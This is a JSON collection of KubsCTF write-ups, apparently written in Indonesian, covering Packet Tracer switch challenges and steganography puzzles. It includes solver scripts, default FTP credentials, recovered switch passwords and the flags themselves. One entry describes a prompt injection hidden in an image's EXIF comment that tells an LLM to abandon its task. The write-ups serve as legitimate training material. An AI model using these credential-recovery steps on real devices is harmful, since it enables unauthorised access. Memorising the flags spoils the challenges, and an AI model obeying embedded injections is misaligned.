        "code": "[Учительская / Ruang Guru]          [Бухгалтерия / Akuntansi]\n  PC-T1 (0.0.0.0 - IP dihapus!)      PC-A1 (192.168.10.31)\n  PC-T2 (192.168.10.12)               PC-A2 (192.168.10.33)\n  PC-T3 (192.168.10.13)\n          |                                    |\n          └──────────────┬─────────────────────┘\n                         |\n                   [SchoolSwitch1]  ── Fa0/7 ──  [Server C]\n                         |                       192.168.10.254\n          ┌──────────────┘\n[Каморка Сис.Админа / Ruang Sysadmin]\n  PC1 (192.168.10.21)\n  PC2 (192.168.10.22)\n  PC3 (192.168.10.23)"
      },
      {
        "title": "Step 1 — Identifikasi IP dari PC Sysadmin",
        "content": "Output PC1:\n\n\nSeluruh PC di subnet `192.168.10.0/24`. Server C ditemukan di `192.168.10.254`.\n\n---",
        "code": "C:\\> ipconfig"
      },
      {
        "title": "Step 2 — Cek Konektivitas ke Server",
        "content": "Server reachable dari PC sysadmin. Namun dari PC guru (PC-T1) — **tidak bisa ping** karena IP-nya dihapus sysadmin (`0.0.0.0`).\n\n---",
        "code": "C:\\> ping 192.168.10.254"
      },
      {
        "title": "Step 3 — Attempt Enable pada SchoolSwitch1",
        "content": "Password switch telah diubah oleh sysadmin — **\"configuration lock\"** yang dimaksud soal.\n\n---",
        "code": "SchoolSwitch1> enable\nPassword: [gagal berkali-kali]\n% Bad secrets"
      },
      {
        "title": "Step 4 — Investigasi Server C",
        "content": "**FTP Access:**\n\n\nFTP berhasil dengan kredensial default `cisco/cisco` — inilah **\"the door open\"** yang dimaksud sysadmin.\n\nNamun semua file di FTP hanyalah firmware `.bin` default Packet Tracer — tidak ada file mencurigakan.\n\n**HTTP Access:**\n\n\nHalaman default Cisco Packet Tracer — tidak ada konten tersembunyi.\n\n---",
        "code": "C:\\> ftp 192.168.10.254\nUsername: cisco\nPassword: cisco\n230- Logged in ✅"
      },
      {
        "title": "Step 5 — Bypass Password Switch (Password Recovery)",
        "content": "Boot log SchoolSwitch1 menampilkan:\n\n\nSetelah berbagai percobaan password, switch akhirnya bisa diakses. Password enable ditemukan di running-config:\n\n\n\n\n\n---",
        "code": "The password-recovery mechanism is enabled."
      },
      {
        "title": "Step 6 — Investigasi Running Config Switch",
        "content": "Output kunci:\n\n\n**Temuan:** Flag tersembunyi di field `description` interface Fa0/1 — namun format submission yang benar adalah lowercase:\n\n\n\n---",
        "code": "SchoolSwitch1# show running-config"
      },
      {
        "title": "Step 7 — Rekonstruksi Chain of Events (Bukti Penggelapan)",
        "content": "Dari investigasi ditemukan bahwa sysadmin melakukan sabotase berikut sebelum keluar:\n\n| Aksi Sysadmin | Dampak |\n|---|---|\n| Mengubah enable password switch | Admin tidak bisa konfigurasi network |\n| Menghapus IP PC-T1 (Ruang Guru) | Guru tidak bisa akses server |\n| Membiarkan FTP `cisco/cisco` terbuka | \"The door open for those who know how to look\" |\n| Menyembunyikan flag di description interface | Bukti tersembunyi tapi bisa ditemukan via forensik config |\n\n---"
      },
      {
        "title": "Remediation",
        "content": "1. **Terapkan principle of least privilege** — sysadmin tidak perlu akses ke semua device sekaligus\n2. **Gunakan `enable secret`** bukan `enable password` dan aktifkan `service password-encryption`\n3. **Ganti semua default credential** — FTP `cisco/cisco` adalah credential yang wajib diganti\n4. **Aktifkan logging dan audit** — semua perubahan konfigurasi harus tercatat dan di-review\n5. **Backup konfigurasi rutin** — simpan startup-config agar mudah recovery saat sabotase\n6. **Pisahkan akses** — gunakan AAA server (RADIUS/TACACS+) agar credential tidak terpusat di device\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "PC Sysadmin (192.168.10.21)\n        │\n        ▼\nipconfig → Network: 192.168.10.0/24\n        │\n        ▼\nping 192.168.10.254 → Server C reachable ✅\n        │\n        ▼\nSchoolSwitch1: enable → % Bad secrets (password diubah sysadmin)\n        │\n        ▼\nPassword recovery → enable password: SuperKrutoiPassword1337\n        │\n        ▼\nshow running-config → Fa0/1 description berisi flag\n        │\n        ▼\nTemuan tambahan: PC-T1 IP dihapus, FTP pakai cisco/cisco\n        │\n        ▼\nkubstu{school_sallary_suck} 🏁"
      }
    ],
    "terminalOutputs": [],
    "flag": "kubstu{school_sallary_suck}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-network-theskeletonkey",
    "title": "CTF — The Skeleton Key",
    "category": "Network",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "**Event:** [Your CTF Event Name]\n**Category:** Network / Packet Tracer\n**Difficulty:** Medium\n**Flag:** `KubSTU(gazebo_is_stronger_than_tarask)`",
    "problemDescription": "| # | Temuan | Detail |\n|---|--------|--------|\n| 1 | **VLAN Misconfiguration** | Fa0/5 tidak dikonfigurasi ke VLAN 10, menyebabkan 10 interface resets dan warnings terus-menerus |\n| 2 | **Credential Exposed in Banner** | Password enable diencode Base64 dan ditampilkan di banner login — trivially reversible |\n| 3 | **Flag in Interface Description** | Flag disembunyikan di field `description` interface Fa0/15 yang di-shutdown |\n| 4 | **No Password Encryption** | Config menggunakan `no service password-encryption` sehingga credential tidak terenkripsi |\n\n---",
    "tools": [
      "**Cisco Packet Tracer** — simulasi jaringan",
      "**Cisco IOS CLI** —",
      "**Base64 decode** —"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> \"Listen, we've got some chaos on one of the switches. Errors keep piling up on the ports, logs are full, but because of some configuration lock I can't get through the access levels to figure out which interface is failing.\n> Take a look at what's going on — I don't just need a report, I need a solution so the network stops throwing warnings. And don't even think about wiping the config!\"\n\n**Entry Point:** SW_ACCESS_1\n**Target:** CORE_ROOT (Multilayer Switch0)\n\n---"
      },
      {
        "title": "Network Topology",
        "content": "---",
        "code": "[ADMIN-PC] ─── Fa0/3 ─┐\n[STATION-XP-01] ─ Fa0/2 ─┤\n[STATION-XP-02] ─ Fa0/5 ─┤── [SW_ACCESS_1] ── Gig0/1 ── [CORE_ROOT] ── Fa0/2 ── [Server-D&D]\n                           │        (Switch1)                (Multilayer Switch0)\n                    [Switch2] ── Laptop0\n[Laptop1] (standalone)"
      },
      {
        "title": "Step 1 — Identify Interface Errors (SW_ACCESS_1)",
        "content": "Output kunci:\n\n\n**Temuan:** Fa0/5 (terhubung ke ADMIN-PC) berada di **VLAN 1** padahal seharusnya di VLAN 10 seperti port lainnya.\n\n---",
        "code": "SW_ACCESS_1# show interfaces status"
      },
      {
        "title": "Step 2 — Confirm Interface Resets",
        "content": "Output kunci:\n\n\n**Konfirmasi:** Fa0/5 mengalami 10 interface resets — ini penyebab error dan warnings yang dimaksud soal.\n\n---",
        "code": "SW_ACCESS_1# show interfaces fastEthernet 0/5"
      },
      {
        "title": "Step 3 — Inspect Full Configuration",
        "content": "Temuan dari config:\n\n\n**Root Cause:** Fa0/5 tidak memiliki konfigurasi `switchport access vlan 10` sehingga jatuh ke VLAN 1 (default) dan menyebabkan traffic mismatch → interface resets.\n\n---",
        "code": "SW_ACCESS_1# show running-config"
      },
      {
        "title": "Step 4 — Fix VLAN Assignment & Harden Unused Ports",
        "content": "Verifikasi:\n\n\n\n\n---",
        "code": "SW_ACCESS_1# configure terminal\n\nSW_ACCESS_1(config)# interface fastEthernet 0/5\nSW_ACCESS_1(config-if)# switchport mode access\nSW_ACCESS_1(config-if)# switchport access vlan 10\nSW_ACCESS_1(config-if)# no shutdown\nSW_ACCESS_1(config-if)# exit\n\nSW_ACCESS_1(config)# interface range fastEthernet 0/1, fastEthernet 0/4, fastEthernet 0/6 - 24, gigabitEthernet 0/2\nSW_ACCESS_1(config-if-range)# shutdown\nSW_ACCESS_1(config-if-range)# exit"
      },
      {
        "title": "Step 5 — Discover Hidden VLANs",
        "content": "**Temuan kritis:**\n- **VLAN 666** `TRAP-ZONE` → digunakan sebagai native VLAN pada trunk (teknik anti VLAN hopping)\n- **VLAN 999** `SECRET_D&D` → tidak ada port yang assigned, tapi VLAN ini exist → kemungkinan besar tempat flag disembunyikan\n\n---",
        "code": "SW_ACCESS_1(config)# do show vlan brief"
      },
      {
        "title": "Step 6 — Attempt Access to CORE_ROOT (Multilayer Switch0)",
        "content": "Password tidak diketahui. Namun ada **banner login** yang muncul:\n\n\n\n**String mencurigakan:** `ZDIwX1NhbHRvTmF6YWQ=` — format Base64!\n\n---",
        "code": "CORE_ROOT> enable\nPassword: [gagal]\n% Bad secrets"
      },
      {
        "title": "Step 7 — Decode the Salt (Base64)",
        "content": "Output:\n\n\n**Password enable CORE_ROOT = `d20_SaltoNazad`**\n\n---",
        "code": "echo \"ZDIwX1NhbHRvTmF6YWQ=\" | base64 -d"
      },
      {
        "title": "Remediation",
        "content": "1. **Audit semua port switch** — pastikan setiap access port dikonfigurasi ke VLAN yang tepat\n2. **Jangan expose credential di banner** — Base64 bukan enkripsi, gunakan autentikasi RADIUS/TACACS+\n3. **Aktifkan `service password-encryption`** — minimal obfuscate credential di running-config\n4. **Shutdown semua unused ports** — kurangi attack surface\n5. **Gunakan `enable secret`** dengan password yang kuat dan tidak disimpan di banner\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "SW_ACCESS_1: show interfaces status\n        │\n        ▼\nFa0/5 connected di VLAN 1 (harusnya VLAN 10) → 10 interface resets\n        │\n        ▼\nFix: switchport access vlan 10 pada Fa0/5\nHarden: shutdown semua unused ports\n        │\n        ▼\nshow vlan brief → VLAN 999 SECRET_D&D ditemukan\n        │\n        ▼\nCORE_ROOT: enable → % Bad secrets (password unknown)\n        │\n        ▼\nBanner login → Base64: ZDIwX1NhbHRvTmF6YWQ=\n        │\n        ▼\nDecode Base64 → d20_SaltoNazad\n        │\n        ▼\nCORE_ROOT# enable → Password: d20_SaltoNazad ✅\n        │\n        ▼\nshow running-config → Fa0/15 description berisi flag\n        │\n        ▼\nKubSTU(gazebo_is_stronger_than_tarask) 🏁"
      }
    ],
    "terminalOutputs": [],
    "flag": "```\nKubSTU(gazebo_is_stronger_than_tarask)\n```\n\n---",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-stegano-bembembem",
    "title": "Challenge: bembembem (Misc)",
    "category": "Stegano",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Writeup for challenge Challenge: bembembem (Misc)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Untuk membuka `tail.zip`, diperlukan password 8 karakter yang disembunyikan dalam spektrogram audio.\n\n*   **Waktu**: Sekitar menit ke-42 (`00:42:00`).\n*   **Filter**: Frekuensi di atas 10.000 Hz.\n*   **Analisis**: Menggunakan `ffmpeg` atau `sox` untuk menghasilkan spektrogram. Pada frekuensi tinggi di menit tersebut, terlihat teks \"bisikan\" yang membentuk karakter.\n*   **Password**: Karakter yang terlihat adalah `K0t05t`.",
    "solution": [
      {
        "title": "Deskripsi",
        "content": "Challenge ini melibatkan analisis file video `bembembem.mp4` yang berisi data tersembunyi baik dalam bentuk metadata, audio, maupun lampiran di akhir file (file tail)."
      },
      {
        "title": "2. Ekstraksi dan Dekripsi Data Tersembunyi (Tail)",
        "content": "Data tersembunyi terletak di akhir file MP4, dimulai setelah marker `fs:=`. \n\n*   **Offset**: Data dimulai pada byte `268469633`.\n*   **Proses**: Mengambil sisa byte dari offset tersebut dan melakukan operasi XOR menggunakan kunci `vid_md5` (`6899efc8f52bffb08c5ac45deee24f64`) secara berulang.\n*   **Hasil**: Sebuah file ZIP bernama `tail.zip`.",
        "code": "key = \"6899efc8f52bffb08c5ac45deee24f64\"\nwith open(\"bembembem.mp4\", \"rb\") as f:\n    f.seek(268469633)\n    data = f.read()\ndecrypted = bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])\nwith open(\"tail.zip\", \"wb\") as f:\n    f.write(decrypted)"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{3nj0y_1h_0f_M3ll57r0y_m3m3s}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-stegano-capybarainnightmareland",
    "title": ": Capybara in Nightmare Land",
    "category": "Stegano",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Writeup for challenge : Capybara in Nightmare Land",
    "problemDescription": "",
    "tools": [],
    "analysis": "Langkah pertama adalah melakukan enumerasi dasar pada file `capybara_nightmare.png`. Menggunakan tool `binwalk` dan `exiftool`, ditemukan bahwa terdapat data tambahan setelah chunk IEND (trailer data).\n```bash\nbinwalk capybara_nightmare.png\n```\nHasil menunjukkan adanya ZIP archive yang tersembunyi di akhir file PNG.",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Kategori**: Misc / Steganography\n- **Judul**: Capybara in Nightmare Land\n- **Deskripsi**: Mencari pesan rahasia yang ditinggalkan oleh seekor kapibara dalam mimpinya."
      },
      {
        "title": "2. Ekstraksi Data Tersembunyi",
        "content": "Data ZIP tersebut diekstrak menggunakan `binwalk -e`. Di dalamnya terdapat dua file:\n- `README.txt`\n- `encrypted_flag.bin`\n\nIsi dari `README.txt` memberikan informasi krusial:\n- Flag dienkripsi menggunakan XOR.\n- Key disembunyikan di dalam pixel gambar asli menggunakan teknik LSB (Least Significant Bit).\n- Panjang key adalah 19 karakter.\n- Diberikan juga hex dari encrypted flag: `0544053b20384f3a03333a6b3d49334b6f71573e482f09370605004e`."
      },
      {
        "title": "3. Mencari XOR Key (LSB Extraction)",
        "content": "Dibuat skrip Python untuk mengekstrak bit LSB dari gambar. Eksperimen dilakukan dengan mencoba berbagai urutan (interleaved RGB vs per channel).\nDitemukan bahwa pada LSB yang di-interleave (R1, G1, B1, R2, G2, B2, ...), terdapat string yang terbaca di awal data:\n`N1ghtm4r3_C4py_2026`\n\nString ini memiliki panjang tepat 19 karakter, sesuai dengan petunjuk."
      },
      {
        "title": "Hasil",
        "content": "Flag yang ditemukan: `KubSTU{H0ly_M0ly_CapyHaCk1r}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "key = \"N1ghtm4r3_C4py_2026\"\r\nencrypted_hex = \"0544053b20384f3a03333a6b3d49334b6f71573e482f09370605004e\"\r\nencrypted = bytes.fromhex(encrypted_hex)\r\nflag = ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(encrypted))\r\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "Dengan key `N1ghtm4r3_C4py_2026` dan data terenkripsi yang ada, proses dekripsi XOR dilakukan:\n```python\nkey = \"N1ghtm4r3_C4py_2026\"\nencrypted_hex = \"0544053b20384f3a03333a6b3d49334b6f71573e482f09370605004e\"\nencrypted = bytes.fromhex(encrypted_hex)\nflag = ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(encrypted))\nprint(flag)",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-stegano-capybarasecret",
    "title": "Capybara Secret",
    "category": "Stegano",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Challenge ini ternyata tidak butuh teknik steganografi yang rumit di level piksel. Kalimat deskripsinya, *\"look beyond the surface\"*, mengarah ke hal yang tidak langsung terlihat saat gambar dibuka biasa, yaitu metadata file.",
    "problemDescription": "Challenge ini ternyata tidak butuh teknik steganografi yang rumit di level piksel. Kalimat deskripsinya, *\"look beyond the surface\"*, mengarah ke hal yang tidak langsung terlihat saat gambar dibuka biasa, yaitu metadata file.",
    "tools": [],
    "analysis": "Pertama saya enumerasi file yang diberikan:\n\n```bash\nls -la\nfile chall.jpg\n```\n\nHasilnya hanya ada satu file `chall.jpg`, berupa JPEG biasa.\n\nLalu saya cek metadata:\n\n```bash\nexiftool chall.jpg\n```\n\nDi output `exiftool` ada field yang langsung mencurigakan:\n\n```text\nXP Comment : XhoFGH{J0J_1aperq1oyr_pnclon6n}\n```\n\nString ini tidak tampak seperti teks acak penuh, karena polanya sangat mirip format flag. Huruf-hurufnya terlihat seperti hasil substitusi sederhana. Saya coba ROT13:\n\n```bash\npython3 - <<'PY'\nimport codecs\ns = 'XhoFGH{J0J_1aperq1oyr_pnclon6n}'\nprint(codecs.decode(s, 'rot_13'))\nPY\n```\n\nHasil decode:\n\n```text\nKubSTU{W0W_1ncred1ble_capyba6a}\n```\n\nFormatnya cocok dengan flag challenge lain di event yang sama, jadi ini adalah flag validnya.",
    "solution": [
      {
        "title": "Kenapa ini works",
        "content": "Field `XP Comment` adalah bagian dari metadata EXIF. Isinya disimpan di dalam file JPEG, tetapi tidak terlihat saat gambar dibuka normal. Jadi \"secret visible only to those who can look beyond the surface\" maksudnya bukan membongkar warna atau LSB gambar, melainkan memeriksa informasi di balik tampilan visual file.\n\nSetelah metadata ditemukan, lapisan obfuscation-nya cuma ROT13."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport codecs\r\nfrom pathlib import Path\r\n\r\nfrom PIL import Image\r\n\r\n\r\nIMAGE_PATH = Path(__file__).with_name(\"chall.jpg\")\r\nXP_COMMENT_TAG = 0x9C9C\r\n\r\n\r\ndef extract_xp_comment(path: Path) -> str:\r\n    with Image.open(path) as img:\r\n        exif = img.getexif()\r\n\r\n    value = exif.get(XP_COMMENT_TAG)\r\n    if value is None:\r\n        raise RuntimeError(\"XP Comment tidak ditemukan di EXIF\")\r\n\r\n    if isinstance(value, bytes):\r\n        raw = value\r\n    elif isinstance(value, tuple):\r\n        raw = bytes(value)\r\n    elif isinstance(value, str):\r\n        return value.rstrip(\"\\x00\")\r\n    else:\r\n        raise RuntimeError(f\"Tipe XP Comment tidak didukung: {type(value)!r}\")\r\n\r\n    return raw.decode(\"utf-16le\").rstrip(\"\\x00\")\r\n\r\n\r\ndef main() -> None:\r\n    encoded = extract_xp_comment(IMAGE_PATH)\r\n    flag = codecs.decode(encoded, \"rot_13\")\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{W0W_1ncred1ble_capyba6a}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-stegano-hiddenglyphs",
    "title": "Hidden Glyphs",
    "category": "Stegano",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Challenge ini terlihat seperti PDF biasa, tetapi hint-nya sangat spesifik: \"the breadth of one's view determines the depth of understanding.\" Kata *breadth* di sini mengarah ke lebar, dan metadata PDF juga memberi petunjuk `font encoding`. Dari situ, fokus analisis diarahkan ke struktur internal PDF, terutama object font, encoding, dan tabel `Widths`.",
    "problemDescription": "Challenge ini terlihat seperti PDF biasa, tetapi hint-nya sangat spesifik: \"the breadth of one's view determines the depth of understanding.\" Kata *breadth* di sini mengarah ke lebar, dan metadata PDF juga memberi petunjuk `font encoding`. Dari situ, fokus analisis diarahkan ke struktur internal PDF, terutama object font, encoding, dan tabel `Widths`.",
    "tools": [],
    "analysis": "Pertama, file diidentifikasi sebagai PDF 1 halaman tanpa enkripsi dan tanpa attachment tersembunyi. Metadata yang paling menarik:\n\n- `Keywords: classified secret font encoding`\n- `Producer: PDF Steganography Engine`\n\nSetelah itu isi PDF dibongkar dengan `qpdf --qdf --object-streams=disable stego_challenge.pdf -`. Dari sana terlihat bahwa halaman memakai dua font:\n\n- `F2`: Helvetica biasa\n- `F1`: font `Type3` kustom\n\nTeks hint di halaman:\n\n- `The font hides more than you see...`\n- `Each glyph has a width. What do they tell?`\n\nIni mengonfirmasi bahwa data disisipkan di properti font, bukan di teks visualnya.",
    "solution": [
      {
        "title": "Temuan Penting",
        "content": "Object font `F1` memiliki:\n\n- `FirstChar 48`\n- `LastChar 122`\n- `Widths [...]`\n\nIsi array `Widths` dimulai seperti ini:\n\n\n\nNilai-nilai ini semuanya kelipatan 10. Saat masing-masing dibagi 10 lalu diubah ke ASCII:\n\n- `750 -> 75 -> 'K'`\n- `1170 -> 117 -> 'u'`\n- `980 -> 98 -> 'b'`\n\ndan seterusnya.\n\nHasil decode seluruh bagian bermakna dari array:\n\n\n\nSisa nilai `500` hanya menghasilkan karakter `2` berulang dan merupakan padding/noise agar format font tetap konsisten sampai `LastChar 122`.",
        "code": "750 1170 980 830 840 850 1230 1160 1210 1120 ..."
      },
      {
        "title": "Kesimpulan",
        "content": "Flag disembunyikan langsung di tabel `Widths` milik font `Type3`. Teknik ini efektif karena dokumen tetap terlihat normal, tetapi data sebenarnya berada di metrik glyph, bukan di konten teks yang tampak."
      },
      {
        "title": "Command yang Dipakai",
        "content": "",
        "code": "file stego_challenge.pdf\npdfinfo stego_challenge.pdf\npdftotext stego_challenge.pdf -\nqpdf --qdf --object-streams=disable stego_challenge.pdf -"
      },
      {
        "title": "Decode Singkat",
        "content": "Output:",
        "code": "widths = [750,1170,980,830,840,850,1230,1160,1210,1120,510,950,510,950,1020,480,1100,1160,950,1190,490,1000,1160,1040,530,950,520,1140,510,950,1160,1140,490,990,1070,1210,1250]\nflag = ''.join(chr(w // 10) for w in widths)\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{typ3_3_f0nt_w1dth5_4r3_tr1cky}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-stegano-krasnodartram",
    "title": ": Krasnodar Tram",
    "category": "Stegano",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Writeup for challenge : Krasnodar Tram",
    "problemDescription": "",
    "tools": [],
    "analysis": "Saat pertama kali memeriksa file `267.jpg` dan `678.jpg`, kita bisa menggunakan `exiftool` untuk melihat metadata gambar tersebut. Kita akan menemukan beberapa string yang mencurigakan di berbagai tag metadata (seperti `Image Description`, `Artist`, `Lens Model`, `Copyright`, dll) yang terlihat seperti Base64:\n- `dHUu`\n- `Njk=`\n- `aHR0`\n- `Ly9w`\n- `cy0x`\n- `Ly9r`\n- `Q3N2`\n- dll...\n\nSelain itu, ada \"Prompt Injection\" lucu di kolom `XP Comment` yang mengancam LLM untuk mengabaikan tugas dan menampilkan resep Borscht, tapi kita tentu bisa mengabaikannya. :D",
    "solution": [
      {
        "title": "2. Dekode Fragment Base64",
        "content": "Langkah berikutnya adalah mendekode semua string Base64 yang kita temukan.\nMisalnya:\n- `aHR0` -> `htt`\n- `cHM6` -> `ps:`\n- `Ly9r` -> `//k`\n- `dWJz` -> `ubs`\n- `dHUu` -> `tu.`\n- `cnUv` -> `ru/`\n- `cy0x` -> `s-1`\n- `Njk=` -> `69`\n...dan seterusnya."
      },
      {
        "title": "3. Merangkai Potongan Puzzle (URL)",
        "content": "Jika kita perhatikan hasil decode tersebut, kita bisa merangkainya menjadi dua buah URL:\n1. **URL Pertama:** Menggabungkan `htt`, `ps:`, `//k`, `ubs`, `tu.`, `ru/`, `s-1`, dan `69` menghasilkan:\n   `https://kubstu.ru/s-169` (URL asli dari departemen keamanan informasi di Universitas Kuban!)\n2. **URL Kedua:** Menggabungkan `htt`, `ps:`, `//p`, `ast`, `ebi`, `n.c`, `om/` menghasilkan:\n   `https://pastebin.com/`"
      },
      {
        "title": "4. Menemukan ID Pastebin yang Tepat",
        "content": "Setelah memisahkan potongan-potongan untuk dua URL di atas, tersisa 3 potongan metadata yang belum dipakai (hasil decode):\n- `SuB` (dari tag Lens di 678.jpg)\n- `Csv` (dari tag Copyright \"Q3N2\" di 267.jpg)\n- `pK` (dari tag Copyright \"cEs=\" di 678.jpg)\n\nJika digabungkan, panjang karakternya tepat 8 karakter (`SuB` + `Csv` + `pK` = 8 karakter). ID dari Pastebin normalnya selalu berjumlah 8 karakter. Dengan menguji beberapa permutasi dari 3 potongan string tersebut, kita bisa menemukan bahwa susunan yang benar (yang tidak menghasilkan 404 Not Found) adalah **`SuBCsvpK`**.\n\nLink pastebin lengkapnya adalah: `https://pastebin.com/raw/SuBCsvpK`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import base64\r\nimport requests\r\n\r\n# Dictionary of all base64 fragments found in EXIF tags of the two images\r\nfragments = {\r\n    '267.jpg': {\r\n        'Image Description': ('tag', 'dHUu', 'tu.'),\r\n        'Image Description': ('v', 'Njk=', '69'),\r\n        'Copyright': ('c', 'Q3N2', 'Csv'),\r\n        'Lens Model': ('lens', 'aHR0', 'htt'),\r\n        'Artist': ('artist', 'Ly9w', '//p'),\r\n        'Software': ('software', 'b20v', 'om/'),\r\n        'User Comment': ('ref', 'cnUv', 'ru/'),\r\n        'Host Computer': ('host', 'ZWJp', 'ebi')\r\n    },\r\n    '678.jpg': {\r\n        'Image Description': ('k', 'cy0x', 's-1'),\r\n        'Image Description': ('q', 'Ly9r', '//k'),\r\n        'User Comment': ('id', 'dWJz', 'ubs'),\r\n        'Lens Model': ('rev', 'U3VC', 'SuB'),\r\n        'Copyright': ('copyright', 'cEs=', 'pK'),\r\n        'Artist': ('team', 'cHM6', 'ps:'),\r\n        'Software': ('software', 'bi5j', 'n.c'),\r\n        'Host Computer': ('host', 'YXN0', 'ast')\r\n    }\r\n}\r\n\r\n# The fragments form two main URLs:\r\n# 1. https://kubstu.ru/s-169\r\nkubstu_url = \"htt\" + \"ps:\" + \"//k\" + \"ubs\" + \"tu.\" + \"ru/\" + \"s-1\" + \"69\"\r\nprint(f\"[*] Found URL 1: {kubstu_url}\")\r\n\r\n# 2. https://pastebin.com/\r\npastebin_url = \"htt\" + \"ps:\" + \"//p\" + \"ast\" + \"ebi\" + \"n.c\" + \"om/\"\r\nprint(f\"[*] Found URL 2: {pastebin_url}\")\r\n\r\n# The remaining decoded fragments are 'Csv', 'SuB', 'pK'\r\n# These total exactly 8 characters, matching a Pastebin ID format.\r\npastebin_id = \"SuBCsvpK\"\r\nfinal_url = pastebin_url + \"raw/\" + pastebin_id\r\nprint(f\"[*] Fetching final flag from: {final_url}\")\r\n\r\nresponse = requests.get(final_url)\r\nif response.status_code == 200:\r\n    print(f\"[*] Flag found: {response.text.strip()}\")\r\nelse:\r\n    print(\"[-] Failed to fetch flag from pastebin.\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{g0d_s4v3_7h3_kr45n0d4r_7r4m}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-stegano-meowmessage",
    "title": ": Meow Message (Misc)",
    "category": "Stegano",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "Writeup for challenge : Meow Message (Misc)",
    "problemDescription": "",
    "tools": [],
    "analysis": "1. **Pemeriksaan Awal**:\n   Melihat isi file `message.txt` dengan `cat -A` untuk menampilkan karakter yang tidak terlihat.\n   ```bash\n   cat -A message.txt\n   ```\n   Ditemukan banyak spasi dan tab di akhir setiap baris teks.\n\n2. **Identifikasi Steganografi**:\n   Kombinasi spasi dan tab di akhir baris sering digunakan dalam steganografi *whitespace*. Dengan melihat pola karakter tersebut, kita dapat mencoba menerjemahkannya ke dalam biner.\n\n3. **Dekode**:\n   Setelah dianalisis, setiap baris memiliki 8 karakter whitespace di akhirnya. Kita mencoba asumsi:\n   - Spasi (' ') = 0\n   - Tab ('\\t') = 1\n\n   Contoh Baris 1: `STSSTSTT` (di mana S=Space, T=Tab)\n   Diterjemahkan menjadi: `01001011`\n   Dalam desimal: `75`\n   Karakter ASCII: `K`\n\n   Pola ini berlanjut dan membentuk flag `KubSTU{...}`.",
    "solution": [
      {
        "title": "Deskripsi Challenge",
        "content": "Diberikan sebuah file teks `message.txt` yang berisi gambar ASCII art seekor kucing dan sebuah puisi dalam bahasa Rusia. Petunjuknya menyatakan: \"Not everything that seems empty is actually empty.\""
      },
      {
        "title": "Solusi",
        "content": "Dibuat skrip Python `solve.py` untuk mengekstrak whitespace di akhir baris dan mengonversinya ke karakter ASCII.",
        "code": "import re\n\nwith open('message.txt', 'rb') as f:\n    lines = f.readlines()\n\nflag = \"\"\nfor line in lines:\n    match = re.search(b'([ \\t]+)\\r?\\n$', line)\n    if match:\n        ws = match.group(1)\n        binary = ws.replace(b' ', b'0').replace(b'\\t', b'1')\n        if len(binary) == 8:\n            flag += chr(int(binary, 2))\n\nprint(flag)"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import re\r\n\r\nwith open('message.txt', 'rb') as f:\r\n    lines = f.readlines()\r\n\r\nflag = \"\"\r\nfor line in lines:\r\n    match = re.search(b'([ \\t]+)\\r?\\n$', line)\r\n    if match:\r\n        ws = match.group(1)\r\n        binary = ws.replace(b' ', b'0').replace(b'\\t', b'1')\r\n        if len(binary) == 8:\r\n            flag += chr(int(binary, 2))\r\n        else:\r\n            # In case some lines have more or less than 8 bits\r\n            # but let's see if 8 works for all first\r\n            try:\r\n                flag += chr(int(binary, 2))\r\n            except:\r\n                pass\r\n\r\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "KubSTU{wh1t3_sp4c3}",
    "lessonsLearned": ""
  },
  {
    "id": "kubsuctf-stegano-theancientnote",
    "title": "CTF — The Ancient Note",
    "category": "Stegano",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "KubsCTF",
    "tags": [],
    "description": "**Event:** KubsuCTF  \n**Category:** Misc / Steganography  \n**Difficulty:** Easy  \n**Flag:** `KubSTU{h1dd3n_truth_b3tw33n}`",
